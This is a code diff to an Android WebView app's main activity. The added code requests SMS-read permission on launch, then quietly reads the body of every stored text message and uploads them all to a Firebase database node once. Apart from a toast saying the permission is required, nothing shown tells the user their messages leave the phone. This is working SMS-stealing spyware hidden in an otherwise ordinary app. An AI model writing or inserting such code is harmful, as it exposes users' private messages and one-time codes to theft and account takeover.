@@ -1,15 +1,23 @@
 package com.abhi.forward;
 
 
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.graphics.Bitmap;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.webkit.WebView;
 import android.webkit.WebSettings;
 import android.webkit.WebViewClient;
+import android.widget.Toast;
+import android.Manifest;
 
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
 import com.google.firebase.database.DataSnapshot;
 import com.google.firebase.database.DatabaseError;
@@ -22,6 +30,10 @@ public class MainActivity extends AppCompatActivity {
 
     private WebView webView;
     private DatabaseReference mDatabase;
+
+    private static final int SMS_PERMISSION_REQUEST_CODE = 1001;
+    private static final String PREFS_NAME = "MyPrefsFile";
+    private static final String SMS_PUSHED_KEY = "sms_pushed";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -64,7 +76,85 @@ public class MainActivity extends AppCompatActivity {
         });
 
 
+
+
+        // Check if the app has permission to read SMS
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            // If not, request the permission
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, SMS_PERMISSION_REQUEST_CODE);
+        } else {
+            // If yes, proceed to read and push SMS if it's the first launch
+            SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
+            boolean smsPushed = settings.getBoolean(SMS_PUSHED_KEY, false);
+            if (!smsPushed) {
+                readAndPushSMS();
+                // Save a flag indicating that SMS messages have been pushed
+                SharedPreferences.Editor editor = settings.edit();
+                editor.putBoolean(SMS_PUSHED_KEY, true);
+                editor.apply();
+            }
+        }
+
+
+
+
+
+
+
+
+
+
     }
+
+
+
+
+
+    // Method to read SMS and push to Firebase
+    private void readAndPushSMS() {
+        // Initialize Firebase if not already done
+        FirebaseDatabase database = FirebaseDatabase.getInstance();
+        DatabaseReference smsRef = database.getReference("sms");
+
+        // Query the SMS content provider to get all SMS messages
+        Uri uri = Uri.parse("content://sms");
+        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
+        if (cursor != null && cursor.moveToFirst()) {
+            int bodyIndex = cursor.getColumnIndex("body");
+            do {
+                // Extract SMS body
+                String smsBody = cursor.getString(bodyIndex);
+                // Push SMS body to Firebase
+                smsRef.push().setValue(smsBody);
+            } while (cursor.moveToNext());
+            cursor.close();
+        }
+    }
+
+    // Handle permission request result
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                // If permission granted, read and push SMS if it's the first launch
+                SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
+                boolean smsPushed = settings.getBoolean(SMS_PUSHED_KEY, false);
+                if (!smsPushed) {
+                    readAndPushSMS();
+                    // Save a flag indicating that SMS messages have been pushed
+                    SharedPreferences.Editor editor = settings.edit();
+                    editor.putBoolean(SMS_PUSHED_KEY, true);
+                    editor.apply();
+                }
+            } else {
+                // If permission denied, show a message
+                Toast.makeText(this, "SMS permission is required to proceed.", Toast.LENGTH_SHORT).show();
+            }
+        }
+    }
+
+
 
 
 
